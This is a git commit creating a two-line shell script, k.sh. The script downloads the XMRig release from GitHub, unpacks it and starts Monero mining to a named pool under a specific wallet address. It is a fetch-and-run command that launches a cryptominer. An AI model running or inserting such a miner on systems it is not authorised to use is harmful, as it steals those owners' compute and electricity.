1c327eaa4edfbf0a1eb4fb24e2b3c308ba39e999
clipvui2512 <clipvui2512@gmail.com>
2021-10-23 22:33:33 +0700

    Create k.sh

---
+++ k.sh
@@ -0,0 +1,2 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvf xmrig-6.15.2-linux-static-x64.tar.gz && cd xmrig-6.15.2
+./xmrig -o pool.minexmr.com:4444 -u 4Ahd3Nv3DxMNp5wv1SxoT2NL1BjowyfoxLXnv6mfpTNFb5uYcicH9QZZzVTke2X6it1Qicv8VALuN46xbsdMZhWaVg6KuVf.rig0011
